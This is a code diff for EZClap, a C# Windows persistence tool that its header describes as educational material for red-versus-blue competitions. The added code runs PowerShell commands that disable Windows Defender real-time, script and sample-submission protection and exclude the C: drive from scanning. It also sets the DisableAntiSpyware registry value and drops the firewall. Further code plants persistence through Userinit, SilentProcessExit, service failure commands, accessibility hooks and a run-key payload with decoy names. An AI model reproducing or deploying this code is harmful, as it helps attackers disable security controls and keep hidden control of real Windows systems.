@@ -4,12 +4,19 @@ using System.Collections.Specialized;
 using System.Collections.Generic;
 using Microsoft.Win32;
 
-/*
- *  TODO: Implement yaml configuration parser 
- *  TODO: Implement non-registry persistence mechanism, such as bitsadmin 
- *  TODO: Get code review and audit from other colleagues  
+/*  Name: EZClap 
+ *  Description: EZClap is a Windows Userland persistence tool which was created for educational purposes in 
+ *  Red vs. Blue team competitions. As the tool is targetted towards beginners in Windows Security, most of the 
+ *  mechanisms are easy to detect through usage of sysinternal tools or simple cmd/powershell commands.
+ * 
+ *  Configuration:
+ *      - Change the app.config file. It's fine to use the default configuration setting, though. 
+ * 
+ *  Modules: 
+ *      - As EZClap (tried to be) is modular, simply add a module, and call it in the main function. 
+ *      For every new module, app.config needs to be changed as well. But it should be easy to do so. 
+ * 
  */
-
 
 namespace ezclap
 {
@@ -33,22 +40,6 @@ namespace ezclap
                 Utils.setHKLMSubKey(finalSilentProcExit, "MonitorProcess", payload[rnd.Next(0,payload.Length-1)]);
 
             }
-            /*  This is way too destructive and have a chance to bomb the box. Removing for now... 
-            foreach (var v in imageFileExecKey.GetSubKeyNames() ) 
-            {
-                try{
-                    string finalLocation = RegistryKeys.hklmImageFileExec + "\\" + v;
-                    setHKLMSubKey(finalLocation, "GlobalFlag", 512);
-
-                    string silentProcesExitFinal = RegistryKeys.hklmSilentProcessExit + "\\" + v;
-                    setHKLMSubKey(silentProcesExitFinal, "ReportingMode", 1);
-                    setHKLMSubKey(silentProcesExitFinal, "MonitorProcess", payload);
-                }
-                catch(Exception e){
-                    continue;
-                } 
-            }
-            */
         }
 
         public static void setup(string originPayloadLoc, string[] newLoc)
@@ -70,13 +61,14 @@ namespace ezclap
                 payloadList.Add(destination);
             }
 
-            // 4. Disable WinDefender
+            // 4. Disable WinDefender - Temp 
             string noRealTime = "Set-MpPreference -DisableRealTimeMonitoring $true -DisableScriptScanning $true -DisableIOAVProtection $true";
             string excludeC = "Add-MpPreference -ExclusionPath \"C:\"";
             string noSubmit = "Set-MpPreference -SubmitSamplesConsent 2";
 
             System.Diagnostics.Process.Start(@"powershell.exe", noRealTime);
             System.Diagnostics.Process.Start(@"powershell.exe", excludeC);
+            System.Diagnostics.Process.Start(@"powershell.exe", noSubmit);
 
             // 5. Drop firewall 
             System.Diagnostics.Process proc = new System.Diagnostics.Process();
@@ -86,6 +78,9 @@ namespace ezclap
             proc.StartInfo.CreateNoWindow = true;
             proc.Start();
             proc.WaitForExit();
+
+            // 6. Disable WinDefender - For Good 
+            Utils.setHKLMSubKey(RegistryKeys.hklmDefender, "DisableAntiSpyware", 1);
 
             // 6. Erase WinDefender
             /*
@@ -114,12 +109,7 @@ namespace ezclap
 
         static void Main(string[] args)
         {
-            // Copy powershell to different name and use it as a payload 
-
-            testConfig();
-
-
-            
+                       
             // ########## Setting up #################
             Random rnd = new Random();
 
@@ -161,7 +151,7 @@ namespace ezclap
             AddAccessibility persistAccessibility = new AddAccessibility(payload);
 
             // 7. Modify userinit 
-            Utils.setHKLMSubKey(RegistryKeys.hklmUserInit, "Userinit", payload + ", C:\\Windows\\System32\\userinit.exe");
+            Utils.setHKLMSubKey(RegistryKeys.hklmUserInit, "Userinit", payload[rnd.Next(0,payload.Length-1)] + ", C:\\Windows\\System32\\userinit.exe");
 
             // 8. Modify FailureCommand 
             List<string> servicesList = Utils.getAllServices();
@@ -171,16 +161,6 @@ namespace ezclap
             modifyImageFileExec(payload);
 
             Console.WriteLine("[+] All persistence mechanisms are done.");
-            Console.ReadLine();
-            /*
-            // 1. Setup 
-            string[] payloadArray = setup(payload);
-            Random rand = new Random();
-
-            string runKeyPayload = "msBuilder.exe -ep bypass -nop -windowstyle hidden -c C:\\Users\\Administrator\\Desktop\\agent.exe";
-            string[] names = new string[] { "Application_Security", "Backup", "Appsec", "Google Updates", "Microsoft_Credential_Guard", "duderino", "catchmeifyoucan" };
-            AddRunKey persistRunKey = new AddRunKey(names, runKeyPayload);
-            */
         }
     }
 }
